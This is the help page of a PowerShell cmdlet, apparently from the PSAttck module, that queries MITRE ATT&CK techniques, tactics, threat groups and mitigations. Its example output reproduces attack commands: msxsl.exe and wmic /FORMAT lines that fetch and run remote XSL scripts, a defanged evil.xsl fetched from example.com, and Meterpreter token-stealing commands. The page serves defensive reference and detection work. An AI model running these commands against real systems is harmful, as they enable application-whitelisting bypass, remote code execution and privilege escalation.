# SYNOPSIS

Get-AttckTechnique gives the user access to all Technique defined within the MITRE ATT&CK framework

## DESCRIPTION

Get-AttckTechnique can access all Technique defined within the MITRE ATT&CK framework.
You can also select a single Technique object by providing a Name value

## PARAMETERS

### PARAMETER Name

A argument completer parameter to retrieve data about a specific Technique by Name

## EXAMPLES

### EXAMPLE Access All Technique Information

```powershell
C:/> Get-AttckTechnique
```

```output
CreatedByReference   : identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
Platform             : {Windows}
Permission           : {User}
Bypass               : {Anti-virus, Application whitelisting, Digital Certificate Validation}
EffectivePermissions : {}
CommandList          : {C:\Windows\Temp\msxsl.exe PathToAtomicsFolder\T1220\src\msxslxmlfile.xml #{xslfile}
                        C:\Windows\Temp\msxsl.exe PathToAtomicsFolder\T1220\src\msxslxmlfile.xml PathToAtomicsFolder\T1220\src\msxslscript.xsl
                        C:\Windows\Temp\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml #{xslfile}
                        C:\Windows\Temp\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml 
                       https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
                        wmic.exe #{wmic_command} /FORMAT:PathToAtomicsFolder\T1220\src\wmicscript.xsl
                        wmic.exe process list /FORMAT:PathToAtomicsFolder\T1220\src\wmicscript.xsl
                        wmic.exe #{wmic_command} /FORMAT:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
                        wmic.exe process list /FORMAT:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
                        msxsl.exe process|list|/FORMAT|.xslwmic.exe os|get|/FORMAT|.xslwmic.exe}
Commands             : {          }
Queries              : {System.Object[]}
Datasets             : { }
Detections           : {$null}
Network              : No x_mitre_network_requirements attribute found
Remote               : False
SystemRequirements   : Microsoft Core XML Services (MSXML) or access to wmic.exe
Detection            : Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with 
                       prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line 
                       arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter 
                       SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and 
                       purpose of the payload being loaded.
                       
                       The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse 
                       engineering on a system that is not used for these purposes may be suspicious.
DataSource           : {Process monitoring, Process command-line parameters, Process use of network, DLL monitoring}
Id                   : T1220
Name                 : XSL Script Processing
Aliases              : 
Description          : Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support 
                       complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)
                       
                       Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to 
                       [Trusted Developer Utilities](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) 
                       (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL 
                       files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to 
                       package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an 
                       XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give 
                       the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)
                       
                       Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)
                       
                       * <code>msxsl.exe customers[.]xml script[.]xsl</code>
                       * <code>msxsl.exe script[.]xsl script[.]xsl</code>
                       * <code>msxsl.exe script[.]jpeg script[.]jpeg</code>
                       
                       Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management 
                       Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This 
                       technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1117)/ "Squiblydoo" 
                       counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management 
                       Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)
                       
                       Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)
                       
                       * Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
                       * Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>
Reference            : {@{Description=No description attribute found; Url=https://attack.mitre.org/techniques/T1220; ExternalId=T1220; SourceName=mitre-attack}, 
                       @{Description=Wenzel, M. et al. (2017, March 30). XSLT Stylesheet Scripting Using <msxsl:script>. Retrieved July 3, 2018.; 
                       Url=https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script; ExternalId=No external_id attribute 
                       found; SourceName=Microsoft XSLT Script Mar 2017}, @{Description=Microsoft. (n.d.). Command Line Transformation Utility (msxsl.exe). Retrieved 
                       July 3, 2018.; Url=https://www.microsoft.com/download/details.aspx?id=21714; ExternalId=No external_id attribute found; SourceName=Microsoft 
                       msxsl.exe}, @{Description=netbiosX. (2017, July 6). AppLocker Bypass – MSXSL. Retrieved July 3, 2018.; 
                       Url=https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/; ExternalId=No external_id attribute found; SourceName=Penetration Testing Lab 
                       MSXSL July 2017}…}
Created              : 10/17/2018 00:14:20
Modified             : 09/12/2019 17:29:15
Stix                 : attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3
Type                 : attack-pattern
Wiki                 : https://attack.mitre.org/techniques/T1220
Contributor          : Avneet Singh Casey Smith Praetorian

...
```

### EXAMPLE Retrieve a specific Technique by Name

```powershell
C:/> Get-AttckTechnique -Name 'Access Token Manipulation'
```

```output
CreatedByReference   : identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
Platform             : {Windows}
Permission           : {User, Administrator}
Bypass               : {}
EffectivePermissions : {SYSTEM}
CommandList          : {Token Stealing:
                       steal_token pid# Token Stealing:
                       use incognito
                       list_tokens -u
                       impersonate_token DOMAIN\\User
                       or:
                       steal_token {pid} #list processes by user,
                       $owners = @{}
                       gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
                       get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
                       
                       #Steal Token
                       Set-Location $PathToAtomicsFolder
                       .\T1134\src\T1134.ps1
                       }
Commands             : {  }
Queries              : {System.Object[]}
Datasets             : { }
Detections           : {$null}
Network              : No x_mitre_network_requirements attribute found
Remote               : No x_mitre_remote_support attribute found
SystemRequirements   : No x_mitre_system_requirements attribute found
Detection            : If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, 
                       analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: 
                       Microsoft Command-line Logging)
                       
                       If an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful 
                       analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. 
                       
                       There are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., <code>LogonUser</code> (Citation: Microsoft 
                       LogonUser), <code>DuplicateTokenEx</code>(Citation: Microsoft DuplicateTokenEx), and <code>ImpersonateLoggedOnUser</code>(Citation: Microsoft 
                       ImpersonateLoggedOnUser)). Please see the referenced Windows API pages for more information.
                       
                       Query systems for process and thread token information and look for inconsistencies such as user owns processes impersonating the local SYSTEM 
                       account.(Citation: BlackHat Atkinson Winchester Token Manipulation)
DataSource           : {API monitoring, Access tokens, Process monitoring, Process command-line parameters}
Id                   : T1134
Name                 : Access Token Manipulation
Aliases              : 
Description          : Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process 
                       appear as though it belongs to someone other than the user that started the process. When this occurs, the process also takes on the security 
                       context associated with the new token. For example, Microsoft promotes the use of access tokens as a security best practice. Administrators 
                       should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command 
                       <code>runas</code>.(Citation: Microsoft runas)
                         
                       Adversaries may use access tokens to operate under a different user or system security context to perform actions and evade detection. An 
                       adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. An adversary 
                       must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate 
                       their security context from the administrator level to the SYSTEM level. An adversary can use a token to authenticate to a remote system as the 
                       account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)
                       
                       Access tokens can be leveraged by adversaries through three methods:(Citation: BlackHat Atkinson Winchester Token Manipulation)
                       
                       **Token Impersonation/Theft** - An adversary creates a new access token that duplicates an existing token using 
                       <code>DuplicateToken(Ex)</code>. The token can then be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread to 
                       impersonate a logged on user's security context, or with <code>SetThreadToken</code> to assign the impersonated token to a thread. This is 
                       useful for when the target user has a non-network logon session on the system.
                       
                       **Create Process with a Token** - An adversary creates a new access token with <code>DuplicateToken(Ex)</code> and uses it with 
                       <code>CreateProcessWithTokenW</code> to create a new process running under the security context of the impersonated user. This is useful for 
                       creating a new process under the security context of a different user.
                       
                       **Make and Impersonate Token** - An adversary has a username and password but the user is not logged onto the system. The adversary can then 
                       create a logon session for the user using the <code>LogonUser</code> function. The function will return a copy of the new session's access 
                       token and the adversary can use <code>SetThreadToken</code> to assign the token to a thread.
                       
                       Any standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require 
                       access to an administrator account.
                       
                       Metasploit’s Meterpreter payload allows arbitrary token manipulation and uses token impersonation to escalate privileges.(Citation: Metasploit 
                       access token) The Cobalt Strike beacon payload allows arbitrary token impersonation and can also create tokens. (Citation: Cobalt Strike Access 
                       Token)
Reference            : {@{Description=No description attribute found; Url=https://attack.mitre.org/techniques/T1134; ExternalId=T1134; SourceName=mitre-attack}, 
                       @{Description=No description attribute found; Url=https://capec.mitre.org/data/definitions/633.html; ExternalId=CAPEC-633; SourceName=capec}, 
                       @{Description=Microsoft TechNet. (n.d.). Runas. Retrieved April 21, 2017.; Url=https://technet.microsoft.com/en-us/library/bb490994.aspx; 
                       ExternalId=No external_id attribute found; SourceName=Microsoft runas}, @{Description=netbiosX. (2017, April 3). Token Manipulation. Retrieved 
                       April 21, 2017.; Url=https://pentestlab.blog/2017/04/03/token-manipulation/; ExternalId=No external_id attribute found; SourceName=Pentestlab 
                       Token Manipulation}…}
Created              : 12/14/2017 16:46:06
Modified             : 10/14/2019 20:45:04
Stix                 : attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48
Type                 : attack-pattern
Wiki                 : https://attack.mitre.org/techniques/T1134
Contributor          : Tom Ueltschi @c_APT_ure Travis Smith, Tripwire Robby Winchester, @robwinchester3 Jared Atkinson, @jaredcatkinson
```

### EXAMPLE Retrieve which Tactics are associated with a Technique

```powershell
C:/> (Get-AttckTechnique -Name 'Audio Capture').Tactics() 
```

```output
CreatedByReference : identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
ShortName          : collection
Id                 : TA0009
Name               : Collection
Aliases            : 
Description        : The adversary is trying to gather data of interest to their goal.
                     
                     Collection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to 
                     following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target 
                     sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard 
                     input.
Reference          : {@{Description=No description attribute found; Url=https://attack.mitre.org/tactics/TA0009; ExternalId=TA0009; SourceName=mitre-attack}}
Created            : 10/17/2018 00:14:20
Modified           : 07/19/2019 17:44:53
Stix               : x-mitre-tactic--d108ce10-2419-4cf9-a774-46161d6c6cfe
Type               : x-mitre-tactic
Wiki               : https://attack.mitre.org/tactics/TA0009
Contributor        : 
```


### EXAMPLE Retrieve which Actors use a Technique

```powershell
C:/> (Get-AttckTechnique -Name 'Audio Capture').Actors() 
```

```output

CreatedByReference : identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
Revoked            : No revoked attribute found
Id                 : G0067
Name               : APT37
Aliases            : APT37 ScarCruft Reaper Group123 TEMP.Reaper
Description        : [APT37](https://attack.mitre.org/groups/G0067) is a suspected North Korean cyber espionage group that has been active since at least 2012. The 
                     group has targeted victims primarily in South Korea, but also in Japan, Vietnam, Russia, Nepal, China, India, Romania, Kuwait, and other parts of 
                     the Middle East. [APT37](https://attack.mitre.org/groups/G0067) has also been linked to following campaigns between 2016-2018: Operation 
                     Daybreak, Operation Erebus, Golden Time, Evil New Year, Are you Happy?, FreeMilk, Northern Korean Human Rights, and Evil New Year 2018. 
                     (Citation: FireEye APT37 Feb 2018) (Citation: Securelist ScarCruft Jun 2016) (Citation: Talos Group123)
                     
                     North Korean group definitions are known to have significant overlap, and the name [Lazarus Group](https://attack.mitre.org/groups/G0032) is 
                     known to encompass a broad range of activity. Some organizations use the name Lazarus Group to refer to any activity attributed to North 
                     Korea.(Citation: US-CERT HIDDEN COBRA June 2017) Some organizations track North Korean clusters or groups such as Bluenoroff,(Citation: Kaspersky 
                     Lazarus Under The Hood Blog 2017) [APT37](https://attack.mitre.org/groups/G0067), and [APT38](https://attack.mitre.org/groups/G0082) separately, 
                     while other organizations may track some activity associated with those group names by the name Lazarus Group.
Reference          : {@{Description=No description attribute found; Url=https://attack.mitre.org/groups/G0067; ExternalId=G0067; SourceName=mitre-attack}, 
                     @{Description=(Citation: FireEye APT37 Feb 2018); Url=No url attribute found; ExternalId=No external_id attribute found; SourceName=APT37}, 
                     @{Description=(Citation: Securelist ScarCruft Jun 2016) (Citation: FireEye APT37 Feb 2018)(Citation: Securelist ScarCruft May 2019); Url=No url 
                     attribute found; ExternalId=No external_id attribute found; SourceName=ScarCruft}, @{Description=(Citation: FireEye APT37 Feb 2018); Url=No url 
                     attribute found; ExternalId=No external_id attribute found; SourceName=Reaper}…}
Created            : 04/18/2018 17:59:24
Modified           : 10/04/2019 22:07:45
Stix               : intrusion-set--4a2ce82e-1a74-468a-a6fb-bbead541383c
Type               : intrusion-set
Wiki               : https://attack.mitre.org/groups/G0067
Contributor        : Valerii Marchuk, Cybersecurity Help s.r.o.
```

### EXAMPLE Retrieve mitigation for a given Technique

```powershell
C:/> (Get-AttckTechnique -Name 'Audio Capture').Mitigations()
```

```output
CreatedByReference : identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
Id                 : T1123
Name               : Audio Capture Mitigation
Aliases            : 
Description        : Mitigating this technique specifically may be difficult as it requires fine-grained API control. Efforts should be focused on preventing unwanted 
                     or unknown code from executing on a system.
                     
                     Identify and block potentially malicious software that may be used to record audio by using whitelisting (Citation: Beechey 2010) tools, like 
                     AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where 
                     appropriate. (Citation: TechNet Applocker vs SRP)
Reference          : {@{Description=No description attribute found; Url=https://attack.mitre.org/mitigations/T1123; ExternalId=T1123; SourceName=mitre-attack}, 
                     @{Description=Beechey, J. (2010, December). Application Whitelisting: Panacea or Propaganda?. Retrieved November 18, 2014.; 
                     Url=http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599; ExternalId=No external_id 
                     attribute found; SourceName=Beechey 2010}, @{Description=Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved 
                     February 2, 2016.; Url=http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html; ExternalId=No external_id attribute found; 
                     SourceName=Windows Commands JPCERT}, @{Description=NSA Information Assurance Directorate. (2014, August). Application Whitelisting Using 
                     Microsoft AppLocker. Retrieved March 31, 2016.; 
                     Url=https://www.iad.gov/iad/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm; ExternalId=No external_id 
                     attribute found; SourceName=NSA MS AppLocker}…}
Created            : 10/17/2018 00:14:20
Modified           : 07/24/2019 14:33:42
Stix               : course-of-action--16dd03c6-0dfb-4d77-89cd-9ff3ee6e533d
Type               : course-of-action
Wiki               : https://attack.mitre.org/mitigations/T1123
Contributor        : 
```

## OUTPUTS

PSAttck.Enterprise.Technique

## NOTES

Created By: Josh Rickard (MSAdministrator)
Date: 21JAN2020
